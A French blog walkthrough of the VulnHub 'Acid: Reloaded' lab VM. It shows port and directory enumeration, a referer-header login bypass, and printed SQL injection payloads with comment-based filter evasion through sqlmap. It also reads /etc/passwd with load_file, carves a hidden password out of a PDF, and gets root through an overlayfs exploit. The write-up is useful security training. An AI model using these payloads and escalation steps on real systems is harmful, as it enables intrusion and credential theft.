# Solution du CTF Acid: Reloaded de VulnHub

[Acid: Reloaded](https://vulnhub.com/entry/acid-reloaded,127/) n'est pas tout à fait la suite du précédement en revanche il reprend la même interface de login PHP et on retrouve sur la VM des fichiers de l'autre challenge.

On commence à peut près pareil côté ports :

```
Nmap scan report for 192.168.56.92
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 6.7p1 Ubuntu 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 cb4792daeab8d38216220da55f054751 (DSA)
|   2048 fd939d2857fbefe08ef1936603673550 (RSA)
|   256 a0a652fb2c32b708b4ed611d2dfac858 (ECDSA)
|_  256 855b0be1b0ad6ad39e8fda38e5bd692f (ED25519)
33447/tcp filtered unknown
```

Faute de mieux on se connecte au SSH :

```shellsession
$ ssh 192.168.56.92
The authenticity of host '192.168.56.92 (192.168.56.92)' can't be established.
ED25519 key fingerprint is SHA256:C0uB9VmjqmE/ozc84o4eswbK3YfOvPb1hEntqHCN6b0.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.92' (ED25519) to the list of known hosts.
    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
 / ___ \ |___ | || |_| |_____|  _ <| |___| |__| |_| / ___ \| |_| | |___| |_| |
/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 

                                                                        -by Acid

Wanna Knock me out ??? 
3.2.1 Let's Start the Game.
```

Notre connexion semble avoir débloqué le `33447` qui apparait si on relance Nmap.

Rien de particulier sur le serveur web qui est en écoute. Je passe donc à une première énumération :

```
301        9l       28w      324c http://192.168.56.92:33447/images
301        9l       28w      322c http://192.168.56.92:33447/html
301        9l       28w      321c http://192.168.56.92:33447/bin
301        9l       28w      321c http://192.168.56.92:33447/css
403       11l       32w      304c http://192.168.56.92:33447/server-status
200       71l       78w      682c http://192.168.56.92:33447/
```

On retrouve notre interface de login sous le dossier `/bin`. C'est repartit pour une seconde énumération :

```
301        9l       28w      330c http://192.168.56.92:33447/bin/includes
302        0l        0w        0c http://192.168.56.92:33447/bin/includes/logout.php
200        0l        0w        0c http://192.168.56.92:33447/bin/includes/functions.php
302        0l        0w        0c http://192.168.56.92:33447/bin/includes/validation.php
200        0l        0w        0c http://192.168.56.92:33447/bin/includes/db_connect.php
301        9l       28w      325c http://192.168.56.92:33447/bin/css
301        9l       28w      328c http://192.168.56.92:33447/bin/styles
301        9l       28w      324c http://192.168.56.92:33447/bin/js
200       44l       94w     1467c http://192.168.56.92:33447/bin/
301        9l       28w      327c http://192.168.56.92:33447/bin/crack
200       12l       27w      309c http://192.168.56.92:33447/bin/error.php
200       44l       94w     1467c http://192.168.56.92:33447/bin/index.php
200       44l       94w     1467c http://192.168.56.92:33447/bin/
200       21l       37w      675c http://192.168.56.92:33447/bin/dashboard.php
200        3l        3w       17c http://192.168.56.92:33447/bin/.gitignore
200       10l      171w     1106c http://192.168.56.92:33447/bin/crack/license.txt
200       14l       83w      472c http://192.168.56.92:33447/bin/crack/README.txt
301        9l       28w      330c http://192.168.56.92:33447/bin/crack/js
301        9l       28w      331c http://192.168.56.92:33447/bin/crack/css
```

Les identifiants par défaut trouvés sur le CTF `Acid: Server` ne fonctionnent pas ici et le script de login ne se montre pas plus vulnérable.

## Devines d'où je t'appelle ?

J'ai peu d'entrées sur lesquelles je peux injecter des payloads alors je me dis que peut être que le script `dashboard` qui me retourne le message suivant :

> You are not authorized to access this page.

m'ouvrira ses portes si je semble venir d'un autre script.

Je  teste donc différents referers et alors que je n'aurais pas parié dessus :

```shellsession
$ curl --referer http://192.168.56.92:33447/bin/includes/validation.php http://192.168.56.92:33447/bin/dashboard.php


<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <link rel="stylesheet" href="crack/css/style.css">
        <link rel="stylesheet" href="styles/main.css" />
        <title>Acid-Reloaded</title>
    </head>
    <body>
         <div class="wrapper">
                <div class="container">
                                                                        <center><p> <h1>Congratulations </p>
                        <p>You have bypassed login panel successfully.</h1> <br> </center></p>
                        <center><p><h3>Come'on bang your head here. <a href="l33t_haxor.php">Click</a>.</h3></p>

                        <p><h3>If you are done, please <a href="includes/logout.php">log out</a>.</h3></p></center>

                            </body>
</html>
```

Bingo ! Quand on va sur cette page `l33t_haxor.php` on trouve un lien vers elle même avec un paramètre supplémentaire :

```html
<a href="l33t_haxor.php?id=" style="text-decoration:none"></a>
```

Je balance tout ça à `Wapiti` qui me trouve une faille SQL error-based et une faille time-based :

```
GET /bin/l33t_haxor.php?id=1%C2%BF%27%22%28 HTTP/1.1
GET /bin/l33t_haxor.php?id=%27%2F%2A%2A%2For%2F%2A%2A%2Fsleep%287%29%3D%27 HTTP/1.1
```

Le point important à noter ici c'est que le second payload remplace les espaces par des commentaires SQL du type `/* texte */`. `Wapiti` teste d'abord des payloads plus simple ce qui veut dire que ces derniers ont été bloqués par le script PHP.

On peut laisser `sqlmap` attaquer le script en lui disant d'utiliser le script tamper `space2comment` :

```bash
python sqlmap.py -u "http://192.168.56.92:33447/bin/l33t_haxor.php?id=1" --risk 3 \
  --string "The hacker community may be small, but it possesses the skills that are driving the global economies of the future" \
  --dbms mysql --level 5 --tamper=space2comment
```

Il trouve différentes méthodes d'exploitation dont boolean-based et UNION :

```
sqlmap identified the following injection point(s) with a total of 271 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1') AND 2315=2315 AND ('VDZc'='VDZc

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: id=1') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71706b7a71,(SELECT (ELT(9013=9013,1))),0x71706a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ('gUxc'='gUxc

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1') AND (SELECT 8085 FROM (SELECT(SLEEP(5)))QsKl) AND ('rwDf'='rwDf

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=-6754') UNION ALL SELECT NULL,CONCAT(0x71706b7a71,0x4d6d6c4565416a54766b4661546b674b695a7a454776516551584852476969784e75696b65766861,0x71706a6b71)#
---
```

Je dumpe la liste des tables liées à l'appli PHP :

```
Database: secure_login                                                                                                                                                                                           
[4 tables]
+-----------------+
| UB3R/strcpy.exe |
| login_attempts  |
| members         |
| word            |
+-----------------+
```

Aucune des tables n'est intéressante mais le premier nom de table (`UB3R/strcpy.exe`) correspond à un fichier sur le serveur web qui est en vérité un fichier PDF (pas un exe). Il ne semble, à première vue, pas contenir quoi que ce soit d'intéressant.

Je peux aussi dumper les hashs MySQL car l'utilisateur courant est `root` :

```
*616B4539A8036DB2A22866D602041053E22D4D51
*C585694D9A2AB16831EAB1361DEC1908BE17F739
```

Le second hash se cracke comme étant `mehak`, mot de passe déjà utilisé sur l'autre CTF du même auteur. Il ne semble pas être utilisable pour SSH.

Comme on est root sur MySQL on possède le privilège `FILE`. Je peux donc utiliser l'option `--file-read` de `sqlmap` pour exfiltrer des infos comme le fichier `/etc/passwd` :

```
root:x:0:0:root:/root:/bin/bash                                                                                        
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                        
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                   
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                   
sync:x:4:65534:sync:/bin:/bin/sync                                                                                     
--- snip ---                                    
acid:x:1000:1000:acid,,,:/home/acid:/bin/bash                                                                          
mysql:x:111:126:MySQL Server,,,:/nonexistent:/bin/false                                                                
avahi:x:110:123:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false                                                  
lightdm:x:112:127:Light Display Manager:/var/lib/lightdm:/bin/false                                                    
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false                                                           
kernoops:x:114:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false                                                       
pulse:x:115:128:PulseAudio daemon,,,:/var/run/pulse:/bin/false                                                         
rtkit:x:116:130:RealtimeKit,,,:/proc:/bin/false                                                                        
saned:x:117:131::/var/lib/saned:/bin/false                                                                             
makke:x:1001:1001:,,,:/home/makke:/bin/bash                                                                            
sshd:x:118:65534::/var/run/sshd:/usr/sbin/nologin
```

Malheureusement quand j'essaie de dumper d'autres fichiers (tels que le fichier de conf d'Apache ou le code des fichiers sous `/var/www/html`) je n'obtiens aucune données. Un caprice de `sqlmap` ? Je choisis d'utiliser `ffuf` pour voir quels fichiers je peux extraire avec cette commande :

```bash
ffuf -u "http://192.168.56.92:33447/bin/l33t_haxor.php?id=id=54%27)/**/UNION/**/ALL/**/SELECT/**/NULL,load_file(%27FUZZ%27)%23" \ 
  -w wordlists/files/Linux-files.txt -fw 35
```

Mais idem. Je n'ai pas d'explicatios à ce phénomène... peut être un `chroot` ?

## Inception

Je décide donc de me concentrer sur le fichier PDF. A l'aide d'un file-carver je pourrais peut être extraire d'autres données.

J'ai voulu utiliser `foremost` mais la compilation échoue en 64 bits. J'ai utilisé `PhotoRec` mais il n'a rien trouvé d'intéressant (il est peut être trop spécifique aux systèmes de fichiers).

Finalement j'ai trouvé une image Docker pour `binwalk` :

```shellsession
$ docker run -it --rm -v "$(pwd):/workspace" -w /workspace sheabot/binwalk -e strcpy.pdf

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PDF document, version: "1.5"
529           0x211           Zlib compressed data, default compression
857           0x359           JPEG image data, JFIF standard 1.01
887           0x377           TIFF image data, big-endian, offset of first image directory: 8
28394         0x6EEA          Zlib compressed data, default compression
28839         0x70A7          Zlib compressed data, default compression
108356        0x1A744         Zlib compressed data, default compression

WARNING: Extractor.execute failed to run external extractor 'unrar e '%e'': [Errno 2] No such file or directory: 'unrar', 'unrar e '%e'' might not be installed correctly

WARNING: Extractor.execute failed to run external extractor 'unrar -x '%e'': [Errno 2] No such file or directory: 'unrar', 'unrar -x '%e'' might not be installed correctly
109264        0x1AAD0         RAR archive data, version 4.x, first volume type: MAIN_HEAD

$ ls
strcpy.pdf  _strcpy.pdf.extracted
$ ls _strcpy.pdf.extracted/
1A744  1A744.zlib  1AAD0.rar  211  211.zlib  6EEA  6EEA.zlib  70A7  70A7.zlib
```

Le logiciel a extrait une archive RAR du fichier PDF. Une fois les fichiers de l'archive extraits je me retrouve avec une image (`lol.png`).

Quand j'applique `strings` sur l'image j'obtiens ces dernières lignes :

```
Rar!
"ot 
Avinash.contact
r9lD
,~E|i
TMcX
\       '|!
k\w;
{{5WH
aG]p
Q%,i]
UR]7
@7W!
Rv<{p]]D
gswW
@ugt 
hint.txt
`You have found a contact. Now, go and grab the details :-)
```

Les caractères `Rar!` correspondent à l'entête pour les fichiers RAR. Je relance donc `binwalk` sur l'image et je peux extraire les deux fichiers qui étaient présents :

- `hint.txt` dont on peut voir le contenu plus haut (RAR n'a pas du le compresser en raison de sa petite taille)

- `Avinash.contact` qui est le fichier XML ci-dessous

```xml
<?xml version="1.0" encoding="UTF-8"?>
<c:contact c:Version="1"
    xmlns:c="http://schemas.microsoft.com/Contact"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:MSP2P="http://schemas.microsoft.com/Contact/Extended/MSP2P"
    xmlns:MSWABMAPI="http://schemas.microsoft.com/Contact/Extended/MSWABMAPI">
    <c:CreationDate>2015-08-23T11:39:18Z</c:CreationDate>
    <c:Extended>
        <MSWABMAPI:PropTag0x3A58101F c:ContentType="binary/x-ms-wab-mapi" c:type="binary">AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=</MSWABMAPI:PropTag0x3A58101F>
    </c:Extended>
    <c:ContactIDCollection>
        <c:ContactID c:ElementID="599ef753-f77f-4224-8700-e551bdc2bb1e">
            <c:Value>0bcf610e-a7be-4f26-9042-d6b3c22c9863</c:Value>
        </c:ContactID>
    </c:ContactIDCollection>
    <c:EmailAddressCollection>
        <c:EmailAddress c:ElementID="0745ffd4-ef0a-4c4f-b1b6-0ea38c65254e">
            <c:Type>SMTP</c:Type>
            <c:Address>acid.exploit@gmail.com</c:Address>
            <c:LabelCollection>
                <c:Label>Preferred</c:Label>
            </c:LabelCollection>
        </c:EmailAddress>
        <c:EmailAddress c:ElementID="594eec25-47bd-4290-bd96-a17448f7596a" xsi:nil="true"/>
    </c:EmailAddressCollection>
    <c:NameCollection>
        <c:Name c:ElementID="318f9ce5-7a08-4ea0-8b6a-2ce3e9829ff2">
            <c:FormattedName>Avinash</c:FormattedName>
            <c:GivenName>Avinash</c:GivenName>
        </c:Name>
    </c:NameCollection>
    <c:PersonCollection>
        <c:Person c:ElementID="865f9eda-796e-451a-92b1-bf8ee2172134">
            <c:FormattedName>Makke</c:FormattedName>
            <c:LabelCollection>
                <c:Label>wab:Spouse</c:Label>
            </c:LabelCollection>
        </c:Person>
    </c:PersonCollection>
    <c:PhotoCollection>
        <c:Photo c:ElementID="2fb5b981-cec1-45d0-ae61-7c340cfb3d72">
            <c:LabelCollection>
                <c:Label>UserTile</c:Label>
            </c:LabelCollection>
        </c:Photo>
    </c:PhotoCollection>
</c:contact>
```

Le base64 dans l'entrée `MSWABMAPI` se décode en NooB@123 et permet une connexion avec le compte `makke` :

```shellsession
$ ssh makke@192.168.56.92
    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
 / ___ \ |___ | || |_| |_____|  _ <| |___| |__| |_| / ___ \| |_| | |___| |_| |
/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 

                                                                        -by Acid

Wanna Knock me out ??? 
3.2.1 Let's Start the Game.
                                                                              
makke@192.168.56.92's password: 
Welcome to Ubuntu 15.04 (GNU/Linux 3.19.0-15-generic i686)

 * Documentation:  https://help.ubuntu.com/

Last login: Mon Aug 24 21:25:34 2015 from 192.168.88.236
makke@acid:~$ id
uid=1001(makke) gid=1001(makke) groups=1001(makke)
```

On a comme un indice quand on regarde l'historique bash de l'utilisateur. Visiblement l'auteur du CTF n'a pas fait un ménage poussé :

```bash
makke@acid:~$ cat .bash_history
exit
cd ..
clear
cd /
ls
cd bin/
clear
./overlayfs 
clear
cd /home/makke/
clear
nano .hint
clear
ls
clear
ls
ls -a
cat .hint 
clear
cd /bin/
ls
./overlayfs 
clear
wgt
wget
apt-get remove wget
su
su -
exit
makke@acid:~$ cat .hint
Run the executable to own kingdom :-)
```

Le binaire `overlayfs` n'est plus présent mais j'en ai un sous la main du précédent CTF :

```shellsession
makke@acid:/tmp$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(makke)
# cd /root
# ls
# ls -al
total 68
drwx------  5 root root  4096 Aug 24  2015 .
drwxr-xr-x 22 root root  4096 Aug 24  2015 ..
-rw-------  1 root root 23934 Aug 24  2015 .bash_history
-rw-r--r--  1 root root  3135 Aug  8  2015 .bashrc
drwx------  2 root root  4096 Aug 24  2015 .cache
drwx------  3 root root  4096 Aug  6  2015 .config
drwx------  3 root root  4096 Aug  6  2015 .dbus
-rw-r--r--  1 root root   284 Aug 24  2015 .flag.txt
-rw-------  1 root root  2775 Aug 24  2015 .mysql_history
-rw-------  1 root root   147 Aug 24  2015 .nano_history
-rw-r--r--  1 root root   140 Feb 20  2014 .profile
-rw-r--r--  1 root root    66 Aug  6  2015 .selected_editor
# cat .flag.txt
Dear Hax0r,

You have completed the Challenge Successfully.

Your Flag is : "Black@Current@Ice-Cream"

Kind & Best Regards

-ACiD

Twitter:https://twitter.com/m_avinash143
Facebook: https://www.facebook.com/M.avinash143
LinkedIN: https://in.linkedin.com/pub/avinash-thapa/101/406/4b5
```

*Publié le 3 janvier 2023*
